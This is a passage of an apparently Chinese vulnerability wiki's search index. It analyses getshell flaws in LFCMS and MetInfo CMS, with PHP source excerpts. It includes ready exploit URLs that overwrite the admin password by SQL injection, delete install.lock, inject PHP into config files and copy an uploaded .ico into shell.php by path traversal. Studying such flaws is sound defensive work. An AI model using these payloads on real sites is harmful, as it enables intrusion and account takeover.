https://xz.aliyun.com/t/7844#toc-4","title":"LFCMS\u540e\u53f0getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/#_1","text":"","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/#_2","text":"","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/#_3","text":"\u8be5\u6f0f\u6d1e\u53ef\u4ee5\u5229\u7528\u7684\u539f\u56e0\u4e00\u662f\u5728\u4e8e\u540e\u53f0\u5bf9\u4e8e\u7ad9\u70b9\u914d\u7f6e\u6570\u636e\u6ca1\u6709\u505a\u597d\u8fc7\u6ee4\uff0c\u4e8c\u662f\u5229\u7528\u4e86tp3.2\u7248\u672c\u4e0b\u672c\u8eab\u5b58\u5728\u7684\u7f13\u5b58\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u8d77\u59cb\u5229\u7528\u70b9\u4f4d\u4e8e/Application/Admin/Controller/ConfigController.class.php\u4e2d\u7684save\u65b9\u6cd5\uff0c\u4ee3\u7801\u5982\u4e0b \u8be5\u5904\u5c06\u540e\u53f0\u8bbe\u7f6e\u7684\u914d\u7f6e\u9879\u76f4\u63a5\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u63a5\u7740\u5f53\u7528\u6237\u8bbf\u95ee\u7ad9\u70b9\u524d\u53f0\u9875\u9762\u65f6\uff0c\u4f1a\u8c03\u7528/Application/Home/Controller/HomeController.class.php\u4e2d\u7684_initialize\u65b9\u6cd5\uff0c\u90e8\u5206\u4ee3\u7801\u5982\u56fe \u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u65f6\uff0c\u4f1a\u8c03\u7528\u7b2c\u4e8c\u5341\u4e00\u884c\u7684\u7f13\u5b58\u51fd\u6570\u5199\u7f13\u5b58\u6587\u4ef6\uff0c\u5728\u8fd9\u91cc\u5982\u679c\u5728\u8bbe\u7f6e\u914d\u7f6e\u6570\u636e\u7684\u65f6\u5019\u5199\u5165\u6076\u610f\u7684PHP\u4ee3\u7801\uff0c\u5c31\u53ef\u4ee5\u5728\u7f13\u5b58\u6587\u4ef6\u4e2d\u5199\u5165\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8fdb\u800cgetshell\uff0c\u9996\u5148\u6211\u4eec\u6765\u5230\u540e\u53f0\u7528\u6237\u914d\u7f6e\u8bbe\u7f6e\u5904 \u63d0\u4ea4\u6570\u636e\u6293\u53d6\u6570\u636e\u5305\uff0c\u5728\u5176\u4e2d\u4e00\u4e2a\u8bbe\u7f6e\u9879\u4e2d\u586b\u5165php\u4ee3\u7801\uff0c\u7531\u4e8e\u7f13\u5b58\u6587\u4ef6\u5bf9\u4e8e\u914d\u7f6e\u9879\u8fdb\u884c\u4e86\u6ce8\u91ca\uff0c\u4e3a\u4e86\u9003\u9038\u6ce8\u91ca\u6211\u4eec\u9700\u8981\u53e6\u8d77\u4e00\u884c\u5199\u5165PHP\u4ee3\u7801\u5e76\u5c06\u540e\u9762\u7684\u65e0\u7528\u6570\u636e\u6ce8\u91ca\u6389\uff0c\u5982\u56fe \u7136\u540e\u8bbf\u95ee\u524d\u53f0\u9875\u9762\u751f\u6210\u7f13\u5b58\u6587\u4ef6\uff0c\u7f13\u5b58\u6587\u4ef6\u5728/Application/Runtime/Temp/\u76ee\u5f55\u4e0b\uff0c\u6587\u4ef6\u540d\u4e3a\u7f13\u5b58\u6570\u636e\u540d\u79f0\u7684MD5\u503c\uff0c\u5728\u8fd9\u91cc\u4e5f\u5c31\u662fDB_CONFIG_DATA\u7684MD5\u503c\uff0c\u6211\u4eec\u76f4\u63a5\u8bbf\u95ee\u7f13\u5b58\u6587\u4ef6 http://lfcms.com/Application/Runtime/Temp/95a1fe934b68ebfee8468bf0bc4f0000.php \u6210\u529f\u7684\u5199\u5165\u4e86PHP\u4ee3\u7801","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/#_4","text":"https://xz.aliyun.com/t/7844#toc-4","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfo%20V5.1.7%20getshell/","text":"metinfo\u591a\u4e2a\u6f0f\u6d1e \u00b6 Affected Version \u00b6 \u7248\u672c\uff1aMetInfo V5.1.7 2013\u5e745\u670823 metinfo\u591a\u4e2a\u6f0f\u6d1e(\u53efgetshell) \u5ba1\u8ba1\u4e00\u822c\u5148\u770b\u6838\u5fc3\u6587\u4ef6\u3002 \\include\\common.inc.php \u4e2d\u768421-28\u884c define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc()); isset($_REQUEST['GLOBALS']) && exit('Access Error'); require_once ROOTPATH.'include/global.func.php'; foreach(array('_COOKIE', '_POST', '_GET') as $_request) { foreach($$_request as $_key => $_value) { $_key{0} != '_' && $$_key = daddslashes($_value); } } \u5927\u6982\u4ece21\u884c\u7a0b\u5e8f\u5f00\u59cb\u4f7f\u7528\u4e86\u4f2a register_globals \u673a\u5236\u3002 2\uff1a \u53d8\u91cf\u672a\u521d\u59cb\u5316\u53caextract\u51fd\u6570\u4f7f\u7528\u4e0d\u5f53\u3002 \u5728 common.inc.php \u6587\u4ef6\u968f\u540e\u7684\u4ee3\u7801\u91cc\u5305\u542b\u4e86\u4e00\u4e2a config.inc.php \u7684\u6587\u4ef6, \u770b\u540d\u5b57\u5c31\u77e5\u9053\u662f\u4e00\u4e9b\u521d\u59cb\u5316\u53d8\u91cf\u914d\u7f6e, \u7a0b\u5e8f\u5458\u5c06\u5e94\u7528\u7a0b\u5e8f\u6240\u9700\u53d8\u91cf \u653e\u5728\u4e86 register_globals \u673a\u5236\u4e4b\u540e\u58f0\u660e\u4f30\u8ba1\u5c31\u662f\u6015\u53d8\u91cf\u88ab\u8986\u76d6.\u4f46\u662f config.inc.php \u7684\u4e00\u4e2a\u6570\u7ec4 $settings \u5374\u5fd8\u8bb0\u4e86\u521d\u59cb\u5316. /*\u8bfb\u914d\u7f6e\u6570\u636e*/ $query = \"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'\"; $result = $db->query($query); while($list_config= $db->fetch_array($result)){ if($metinfoadminok)$list_config['value']=str_replace('\"', '&#34;', str_replace(\"'\", '&#39;',$list_config['value'])); $settings_arr[]=$list_config; if($list_config['columnid']){ $settings[$list_config['name'].'_'.$list_config['columnid']]=$list_config['value']; }else{ $settings[$list_config['name']]=$list_config['value']; } if($list_config['flashid']){ $list_config['value']=explode('|',$list_config['value']); $falshval['type']=$list_config['value'][0]; $falshval['x']=$list_config['value'][1]; $falshval['y']=$list_config['value'][2]; $falshval['imgtype']=$list_config['value'][3]; $met_flasharray[$list_config['flashid']]=$falshval; } } @extract($settings); \u5728\u6ca1\u6709\u521d\u59cb\u5316\u7684\u60c5\u51b5\u4e0b\u53c8\u4f7f\u7528\u4e86extract($settings),\u7ed3\u5408\u524d\u9762\u7684register_globals\u673a\u5236\u8fd9\u6837\u5c31\u5bfc\u81f4\u591a\u4e2a\u53d8\u91cf\u53ef\u4ee5\u88ab\u8986\u76d6\u6389\u4ece\u800c\u63a7\u5236\u6574\u4e2a\u7a0b\u5e8f\u903b\u8f91. 3:sql\u6ce8\u5165\u7ed5\u8fc7 \u524d\u9762\u7684\u9632\u6ce8\u5165\u51fd\u6570\u91cc\u53ef\u4ee5\u770b\u5230\u66ff\u6362\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u5173\u952e\u5b57\uff0c\u4f7f\u6ce8\u5165\u7684\u96be\u5ea6\u589e\u52a0\u4e86\uff0c\u4f46\u90a3\u4ec5\u4ec5\u53ea\u5bf9sql\u8bed\u53e5\u7684where\u4e4b\u540e\u6ce8\u5165\u6709\u6240\u9632\u8303\u3002 \u5bf9\u4e8e\u53ef\u4ee5\u8986\u76d6\u7cfb\u7edf\u53d8\u91cf\u7684\u548b\u4eec\u6765\u8bb2\u5c31\u4e0d\u592a\u7ba1\u7528\u4e86\u800c\u4e14\u65e0\u89c6GPC\uff0csql\u6ce8\u91ca\u7b26\u4e5f\u6ca1\u6709\u8fc7\u6ee4\u3002 \u4e3a\u4e86\u964d\u4f4e\u653b\u51fb\u6210\u672c\u6211\u6311\u4e86\u4e00\u5904\u6700\u5bb9\u6613\u5b9e\u73b0\u653b\u51fb\u5730\u65b9\uff0c\u4e00\u4e2aupdate\u7684sql\u8bed\u53e5\u3002 \u5728 include\\hits.php\u768425\u884c\u5de6\u53f3\u3002 $query = \"update $met_hits SET hits='$hits_list[hits]' where id='$id'\"; \u8986\u76d6\u6389$met_hits\u53d8\u91cf\u5c31\u53ef\u4ee5update\u4efb\u4f55\u6570\u636e\u8868\uff0c\u5982\u4fee\u6539\u7ba1\u7406\u5458\u5bc6\u7801\u3002 hits.php?type=img&settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23 \u4f7f\u7528\u5bc6\u78011\u767b\u9646\u540e\u53f0\u62ffshell\uff0c\u518d\u628a\u7ba1\u7406\u5458\u5bc6\u7801\u6539\u56de\u6765\u3002 hits.php?type=img&settings[met_img]=met_admin_table+SET+admin_pass=admin_introduction+WHERE+id=1%23 \u4fee\u6539\u5bc6\u7801 http://192.168.86.194:9000/MetInfo517/include/hits.php?type=img&settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23 \u5c06\u5bc6\u7801\u4fee\u6539\u4e3a 1 References \u00b6 metinfo\u591a\u4e2a\u6f0f\u6d1e(\u53efgetshell) --wooyun-2013-043795 What is register_globals and why is it a security risk? register_globals PHP Backdoors: Hidden With Clever Use of Extract Function PHP extract() Vulnerability","title":"metinfo\u591a\u4e2a\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfo%20V5.1.7%20getshell/#metinfo","text":"","title":"metinfo\u591a\u4e2a\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfo%20V5.1.7%20getshell/#affected-version","text":"\u7248\u672c\uff1aMetInfo V5.1.7 2013\u5e745\u670823 metinfo\u591a\u4e2a\u6f0f\u6d1e(\u53efgetshell) \u5ba1\u8ba1\u4e00\u822c\u5148\u770b\u6838\u5fc3\u6587\u4ef6\u3002 \\include\\common.inc.php \u4e2d\u768421-28\u884c define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc()); isset($_REQUEST['GLOBALS']) && exit('Access Error'); require_once ROOTPATH.'include/global.func.php'; foreach(array('_COOKIE', '_POST', '_GET') as $_request) { foreach($$_request as $_key => $_value) { $_key{0} != '_' && $$_key = daddslashes($_value); } } \u5927\u6982\u4ece21\u884c\u7a0b\u5e8f\u5f00\u59cb\u4f7f\u7528\u4e86\u4f2a register_globals \u673a\u5236\u3002 2\uff1a \u53d8\u91cf\u672a\u521d\u59cb\u5316\u53caextract\u51fd\u6570\u4f7f\u7528\u4e0d\u5f53\u3002 \u5728 common.inc.php \u6587\u4ef6\u968f\u540e\u7684\u4ee3\u7801\u91cc\u5305\u542b\u4e86\u4e00\u4e2a config.inc.php \u7684\u6587\u4ef6, \u770b\u540d\u5b57\u5c31\u77e5\u9053\u662f\u4e00\u4e9b\u521d\u59cb\u5316\u53d8\u91cf\u914d\u7f6e, \u7a0b\u5e8f\u5458\u5c06\u5e94\u7528\u7a0b\u5e8f\u6240\u9700\u53d8\u91cf \u653e\u5728\u4e86 register_globals \u673a\u5236\u4e4b\u540e\u58f0\u660e\u4f30\u8ba1\u5c31\u662f\u6015\u53d8\u91cf\u88ab\u8986\u76d6.\u4f46\u662f config.inc.php \u7684\u4e00\u4e2a\u6570\u7ec4 $settings \u5374\u5fd8\u8bb0\u4e86\u521d\u59cb\u5316. /*\u8bfb\u914d\u7f6e\u6570\u636e*/ $query = \"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'\"; $result = $db->query($query); while($list_config= $db->fetch_array($result)){ if($metinfoadminok)$list_config['value']=str_replace('\"', '&#34;', str_replace(\"'\", '&#39;',$list_config['value'])); $settings_arr[]=$list_config; if($list_config['columnid']){ $settings[$list_config['name'].'_'.$list_config['columnid']]=$list_config['value']; }else{ $settings[$list_config['name']]=$list_config['value']; } if($list_config['flashid']){ $list_config['value']=explode('|',$list_config['value']); $falshval['type']=$list_config['value'][0]; $falshval['x']=$list_config['value'][1]; $falshval['y']=$list_config['value'][2]; $falshval['imgtype']=$list_config['value'][3]; $met_flasharray[$list_config['flashid']]=$falshval; } } @extract($settings); \u5728\u6ca1\u6709\u521d\u59cb\u5316\u7684\u60c5\u51b5\u4e0b\u53c8\u4f7f\u7528\u4e86extract($settings),\u7ed3\u5408\u524d\u9762\u7684register_globals\u673a\u5236\u8fd9\u6837\u5c31\u5bfc\u81f4\u591a\u4e2a\u53d8\u91cf\u53ef\u4ee5\u88ab\u8986\u76d6\u6389\u4ece\u800c\u63a7\u5236\u6574\u4e2a\u7a0b\u5e8f\u903b\u8f91. 3:sql\u6ce8\u5165\u7ed5\u8fc7 \u524d\u9762\u7684\u9632\u6ce8\u5165\u51fd\u6570\u91cc\u53ef\u4ee5\u770b\u5230\u66ff\u6362\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u5173\u952e\u5b57\uff0c\u4f7f\u6ce8\u5165\u7684\u96be\u5ea6\u589e\u52a0\u4e86\uff0c\u4f46\u90a3\u4ec5\u4ec5\u53ea\u5bf9sql\u8bed\u53e5\u7684where\u4e4b\u540e\u6ce8\u5165\u6709\u6240\u9632\u8303\u3002 \u5bf9\u4e8e\u53ef\u4ee5\u8986\u76d6\u7cfb\u7edf\u53d8\u91cf\u7684\u548b\u4eec\u6765\u8bb2\u5c31\u4e0d\u592a\u7ba1\u7528\u4e86\u800c\u4e14\u65e0\u89c6GPC\uff0csql\u6ce8\u91ca\u7b26\u4e5f\u6ca1\u6709\u8fc7\u6ee4\u3002 \u4e3a\u4e86\u964d\u4f4e\u653b\u51fb\u6210\u672c\u6211\u6311\u4e86\u4e00\u5904\u6700\u5bb9\u6613\u5b9e\u73b0\u653b\u51fb\u5730\u65b9\uff0c\u4e00\u4e2aupdate\u7684sql\u8bed\u53e5\u3002 \u5728 include\\hits.php\u768425\u884c\u5de6\u53f3\u3002 $query = \"update $met_hits SET hits='$hits_list[hits]' where id='$id'\"; \u8986\u76d6\u6389$met_hits\u53d8\u91cf\u5c31\u53ef\u4ee5update\u4efb\u4f55\u6570\u636e\u8868\uff0c\u5982\u4fee\u6539\u7ba1\u7406\u5458\u5bc6\u7801\u3002 hits.php?type=img&settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23 \u4f7f\u7528\u5bc6\u78011\u767b\u9646\u540e\u53f0\u62ffshell\uff0c\u518d\u628a\u7ba1\u7406\u5458\u5bc6\u7801\u6539\u56de\u6765\u3002 hits.php?type=img&settings[met_img]=met_admin_table+SET+admin_pass=admin_introduction+WHERE+id=1%23 \u4fee\u6539\u5bc6\u7801 http://192.168.86.194:9000/MetInfo517/include/hits.php?type=img&settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23 \u5c06\u5bc6\u7801\u4fee\u6539\u4e3a 1","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfo%20V5.1.7%20getshell/#references","text":"metinfo\u591a\u4e2a\u6f0f\u6d1e(\u53efgetshell) --wooyun-2013-043795 What is register_globals and why is it a security risk? register_globals PHP Backdoors: Hidden With Clever Use of Extract Function PHP extract() Vulnerability","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/","text":"MetInfoCMS 5.X\u7248\u672cGETSHELL\u6f0f\u6d1e\u5408\u96c6 0x00 \u524d\u8a00 \u00b6 2018\u5e741\u6708\u5e95MetInfoCMS\u5b98\u65b9\u9686\u91cd\u53d1\u5e036.0\u7248\u672c\uff0c\u8c03\u6574\u4e86\u4e4b\u524d\u201c\u6f0f\u6d1e\u767e\u51fa\u201d\u7684\u6846\u67b6\u7ed3\u6784\uff0c\u4fee\uff08\u675c\uff09\u590d\uff08\u7edd\uff09\u4e86\u591a\u4e2a5.X\u7684\u7248\u672c\u540e\u53f0Gestshell\u6f0f\u6d1e\u3002 0x01\u5b89\u88c5\u8fc7\u7a0b\u8fc7\u6ee4\u4e0d\u4e25\u5bfc\u81f4Getshell \u00b6 \u524d\u63d0:\u6709\u5220\u9664/config/install.lock\u6743\u9650 \u9ed8\u8ba4\u5b89\u88c5\u7684\u65f6\u5019\u8bbe\u7f6e\u4e86\u6743\u9650\u7684 @chmod ('../config/install.lock',0554);\uff0c\u6240\u4ee5\u9700\u8981\u5728\u6743\u9650\u4fee\u6539\u4e86\u7684\u60c5\u51b5\u4e0b\u624d\u80fd\u5229\u7528\u8fd9\u4e2a 1. \u7ed3\u5408\u7f51\u4e0a\u7206\u51fa\u7684\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e \u00b6 #/admin/app/batch/csvup.php $classflie=explode('_',$fileField); $classflie=explode('-',$classflie[count($classflie)-1]); $class1=$classflie[0]; $class2=$classflie[1]; $class3=$classflie[2]; $class=$class3?$class3:($class2?$class2:$class1); $classcsv=$db->get_one(\"select * from $met_column where id=$class\"); if(!$classcsv){ metsave(\"../app/batch/contentup.php?anyid=$anyid&lang=$lang\",$lang_csvnocolumn,$depth); } # \u7701\u7565\u4ee3\u7801 @file_unlink($flienamecsv); \u5220\u9664/config/install.lock\u6587\u4ef6\u53ef\u4ee5\u5bfc\u81f4\u91cd\u88c5\uff08\u9700\u8981\u7531\u5bf9\u5e94\u7684\u5220\u9664\u6743\u9650\uff09\uff0c\u5220\u9664\u6587\u4ef6\u7684poc\u5982\u4e0b\uff1a http://xxx.com/admin/app/batch/csvup.php?fileField=1_1231-1 & flienamecsv=../../../config/install.lock 2. \u91cd\u88c5\u65f6\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u8fc7\u6ee4\u4e0d\u5f53 \u00b6 #/install/index.php case 'db_setup': { if($setup==1){ $db_prefix = trim($db_prefix); $db_host = trim($db_host); $db_username = trim($db_username); $db_pass = trim($db_pass); $db_name = trim($db_name); $config=\" <?php /* con_db_host = \\\"$db_host\\\" con_db_id = \\\"$db_username\\\" con_db_pass = \\\"$db_pass\\\" con_db_name = \\\"$db_name\\\" tablepre = \\\"$db_prefix\\\" db_charset = \\\"utf8\\\"; */ ?> \"; $fp=fopen(\"../config/config_db.php\",'w+'); fputs($fp,$config); fclose($fp); \u5728\u6570\u636e\u5e93\u914d\u7f6e\u65f6 \\(db_host,\\) db_username, \\(db_pass,\\) db_name,$db_prefix\u53c2\u6570\u53ef\u63a7\u3002 3. POC \u00b6 \u6570\u636e\u5e93\u914d\u7f6e\u65f6\u4fee\u6539\u4efb\u610f\u53c2\u6570\u4e3a */phpinfo();/* \u53ef\u5bfc\u81f4Getshell\u3002\u70b9\u51fb\u4fdd\u5b58\u4e4b\u540e\uff0c\u76f4\u63a5\u8bbf\u95ee/config/config_db.php\u5373\u53efgetshell\u3002 shell\u5730\u5740: http://xxx.com/config/config_db.php 0x02 CVE-2017-11347\u8865\u4e01\u7ed5\u8fc7\u7ee7\u7eedGetshell \u00b6 \u524d\u63d0\uff1awindows\u670d\u52a1\u5668+\u7f51\u7ad9\u7edd\u5bf9\u8def\u5f84\uff08\u53ea\u9700\u8981\u77e5\u9053\u7f51\u7ad9index.php\u6240\u5728\u76ee\u5f55\u7684\u4e0a\u4e00\u7ea7\u76ee\u5f55\u540d\uff09 1. \u67e5\u627e\u7edd\u5bf9\u8def\u5f84\u7684\u65b9\u6cd5\uff1a \u00b6 \u5229\u7528\u5b89\u88c5\u76ee\u5f55\u4e0b\u7684phpinfo\u6587\u4ef6\uff1a /install/phpinfo.php \u5229\u7528\u62a5\u9519\u4fe1\u606f( \u4fe1\u606f\u5728HTML\u6ce8\u91ca\u4e2d\uff0c\u5fc5\u987b\u901a\u8fc7\u67e5\u770b\u7f51\u9875\u6e90\u7801\u7684\u65b9\u5f0f\u624d\u80fd\u83b7\u53d6\u5185\u5bb9\uff0c\u5426\u5219\u770b\u4e0a\u53bb\u662f\u7a7a\u767d\u9875 ) /app/system/include/public/ui/admin/top.php /app/system/include/public/ui/admin/box.php /app/system/include/public/ui/web/sidebar.php 2. \u6f0f\u6d1e\u5206\u6790 \u00b6 5.3.19\u7248\u672c\u9488\u5bf9CVE-2017-11347\u7684\u8865\u4e01\u5206\u6790 switch($val[2]){ case 1: $address=\"../about/$fileaddr[1]\"; break; case 2: $address=\"../news/$fileaddr[1]\"; break; case 3: $address=\"../product/$fileaddr[1]\"; break; case 4: $address=\"../download/$fileaddr[1]\"; break; case 5: $address=\"../img/$fileaddr[1]\"; break; case 8: $address=\"../feedback/$fileaddr[1]\"; break; default: $address = \"\"; break; } $newfile =\"../../../$val[1]\"; if($address != ''){ Copyfile($address,$newfile); } } } \u5373\uff1a5.3.19\u7248\u672c\u91c7\u53d6\uff1a\u5373\u4f7f\u5728 \\(var[2]\u4e3a\u7a7a\u65f6\uff0c\u9ed8\u8ba4\u7ed9address\u53d8\u91cf\u8d4b\u503c\u4e3a\u7a7a\uff0c\u5e76\u4e14\u4f1a\u5224\u65adaddress\u53c2\u6570\u4e0d\u4e3a\u7a7a\u624d\u8c03\u7528Copyfile\u3002\u4f46\u662f\u5f53\\) var[2]\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u7531\u4e8efileaddr[1]\u53ef\u63a7\u5bfc\u81f4\uff0c\u4ecd\u7136\u53ef\u4ee5\u63a7\u5236\u6587\u4ef6\u8def\u5f84\u4ece\u800cGetshell\u3002 \u6f0f\u6d1e\u5229\u7528(\u7f51\u7ad9\u5b89\u88c5\u5728\u670d\u52a1\u5668\u6839\u8def\u5f84\u7684\u60c5\u51b5)\uff1a \u7b2c\u4e00\u6b65\uff0c\u65b0\u5efa1.ico\u6587\u4ef6\uff0c\u5185\u5bb9\u4e3a\uff1a<?php phpinfo();?> \u5728\u540e\u53f0\"\u5730\u5740\u680f\u56fe\u6807\"\u5904\u4e0a\u4f20\u8be5\u6587\u4ef6\u3002 \u5f97\u5230\u5730\u5740\u4e3a\uff1a http://localhost/upload/file/1506587082.ico \u7b2c\u4e8c\u6b65\uff0c\u53d1\u9001\u5982\u4e0bpayload(\u6ce8\u610f\u5de6\u659c\u6760\u548c\u53f3\u659c\u6760\u4e0d\u80fd\u968f\u610f\u66f4\u6539): http://localhost/admin/app/physical/physical.php?action=op&op=3&valphy=test|/..\\upload\\file\\1506587082.ico/..\\..\\..\\www\\about\\shell.php|1 shell\u7684\u5730\u5740\u4e3a\uff1a http://localhost/about/shell.php 3. POC(\u6ce8\u610f\u5de6\u659c\u6760\u548c\u53f3\u659c\u6760\u4e0d\u80fd\u968f\u610f\u66f4\u6539)\uff1a \u00b6 http://localhost/admin/app/physical/physical.php?action=op&op=3&valphy=test|/..\\\u4e0a\u4f20ico\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84/..\\..\\..\\\u7f51\u7ad9index.php\u8def\u5f84\u7684\u4e0a\u4e00\u5c42\u76ee\u5f55\u540d\\about\\webshell\u7684\u6587\u4ef6\u540d|1 \u7279\u522b\u6ce8\u610f\u5176\u4e2d\u7684\uff1a\u201c\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u201d\uff0c 1.\u5982\u679c\u7f51\u7ad9\u5b89\u88c5\u5728\u670d\u52a1\u5668\u6839\u76ee\u5f55\uff0c\u8fd9wamp/phpstudy\u9ed8\u8ba4\u76ee\u5f55\u503c\u4e3a\u201cwww\"\uff1b\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u8bbe\u7f6e\u4e3a\"www\"; \u5982\u679c\u4e3alamp\u73af\u5883\uff0c\u8fd9\u9ed8\u8ba4\u76ee\u5f55\u503c\u4e3a\u201chtml\u201d\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u8bbe\u7f6e\u4e3a\"html\";\u3002\u5176\u4ed6\u7684\u73af\u5883\u7c7b\u63a8\uff08\u5229\u7528\u7edd\u5bf9\u8def\u5f84\u6cc4\u9732\uff09\u3002 2.\u5982\u679c\u7f51\u7ad9\u5b89\u88c5\u5728\u670d\u52a1\u5668\u7684\u4e8c\u7ea7\u76ee\u5f55\u4e0b\uff0c\u5219\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u8bbe\u7f6e\u4e3a\u4e8c\u7ea7\u76ee\u5f55\u540d\u3002 \u4f8b\u5982:\u7f51\u7ad9\u642d\u5efa\u5728: http://localhost/MetInfoCMS /,\u5219\u7b2c\u4e8c\u6b65\u7684payload\u5982\u4e0b\uff1a http://localhost/MetInfoCMS/admin/app/physical/physical.php?action=op&op=3&valphy=test|/..\\upload\\file\\1506588072.ico/..\\MetInfoCMS.\\MetInfoCMS \\about\\shell.php|1 \u76f8\u5e94\u751f\u6210\u7684shell\u5730\u5740\u4e3a\uff1a http://localhost/MetInfoCMS/about/shell.php 0x03 Copyindx\u51fd\u6570\u5904\u7406\u4e0d\u5f53Getshell \u00b6 1. \u58f0\u660e \u00b6 \u6b64\u6f0f\u6d1e\u70b9\u4f4d\u4e8eadmin/app/physical/physical.php\u6587\u4ef6\uff0c\u6f0f\u6d1e\u548cCVE-2017-11347\u6f0f\u6d1e\u5341\u5206\u76f8\u4f3c\uff0c\u4f46\u662f\u5b58\u5728\u6839\u672c\u7684\u5dee\u5f02\uff0c\u4e0d\u540c\u70b9\u5982\u4e0b\uff1a \uff081\uff09\u89e6\u53d1\u51fd\u6570\u662fCopyindex\u51fd\u6570\uff0c\u800c\u975eCopyfile \uff082\uff09\u6b64\u6f0f\u6d1e\u4e0d\u662f\u5229\u7528\u6587\u4ef6\u5305\u542brequire_one\uff0c\u800c\u662f\u5229\u7528\u4efb\u610f\u5185\u5bb9\u5199\u5165 \uff083\uff09\u6b64\u6f0f\u6d1eGetshell\u4e0d\u9700\u8981\u4e0a\u4f20\u56fe\u7247 \uff084\uff09\u7ed3\u5408CSRF\u53ef\u4ee5\u5b9e\u73b0\u4e00\u952eGetshell 2. \u6f0f\u6d1e\u70b9 \u00b6 # admin/app/physical/physical.php:197-236 switch($op){ case 1: if(is_dir('../../../'.$val[1])){ deldir('../../../'.$val[1]); echo $lang_physicaldelok; } else{unlink('../../../'.$val[1]); echo $lang_physicaldelok; } break; case 2: $adminfile=$url_array[count($url_array)-2]; $strsvalto=readmin($val[1],$adminfile,1); filetest('../../../'.$val[1]); deldir('../../../'.$val[1]); $dlappfile=parse_ini_file('dlappfile.php',true); if($dlappfile[$strsvalto]['dlfile']){ $return=varcodeb('app'); $checksum=$return['md5']; $met_file='/dl/app_curl.php'; $stringfile=dlfile($dlappfile[$strsvalto]['dlfile'],\"../../../$val[1]\"); }else{ $met_file='/dl/olupdate_curl.php'; $stringfile=dlfile(\"v$metcms_v/$strsvalto\",\"../../../$val[1]\"); } if($stringfile==1){ echo $lang_physicalupdatesuc; } else{ echo dlerror($stringfile); die(); } break; case 3: $fileaddr=explode('/',$val[1]); $filedir=\"../../../\".$fileaddr[0]; if(!file_exists($filedir)){ @mkdir ($filedir, 0777); } if($fileaddr[1]==\"index.php\"){ Copyindx(\"../../../\".$val[1],$val[2]); } \u5f53 \\(action\u7b49\u4e8eop\u800c\u4e14\\) op\u7b49\u4e8e3\u7684\u65f6\u5019\uff0c\u5982\u679c \\(filedir\u4e0d\u5b58\u5728\u5219\u521b\u5efa\\) filedir\u76ee\u5f55\uff0c\u800c\u4e14\u5982\u679c \\(fileaddr[1]\u7b49\u4e8e\"index.php\"\u5219\u8c03\u7528Copyindex\u51fd\u6570\uff0c\u5e76\u4f20\u5165\\) val[1]\u548c \\(val[2]\u53c2\u6570\uff0c\u6b64\u5904\u4e24\u4e2a\u53c2\u6570\u6765\u81ea\u53d8\u91cf\\) valphy,\u5747\u53ef\u63a7\uff01\uff01\u8ddf\u8fdbCopyindex\u51fd\u6570\u6e90\u7801\u5982\u4e0b\uff1a #admin/include/global.func.php:877-884 function Copyindx($newindx,$type){ if(!file_exists($newindx)){ $oldcont =\"<?php\\n# xxx Enterprise Content Management System \\n# Copyright (C) xxx Co.,Ltd (http://www.xxx.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once '../include/module.php'; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) xxx Co., Ltd. (http://www.xxx.cn). All rights reserved.\\n?>\"; $fp = fopen($newindx,w); fputs($fp, $oldcont); fclose($fp); } } \u53ef\u89c1\uff0c\u76f4\u63a5\u628a\u53c2\u6570 \\(type\u76f4\u63a5\u8d4b\u503c\u7ed9\\) fmodule,\u5e76\u5199\u5165\u6587\u4ef6\u5185\u5bb9\uff0c\u6240\u4ee5\u53ef\u4ee5\u6784\u9020payload\u76f4\u63a5getshell. 3. 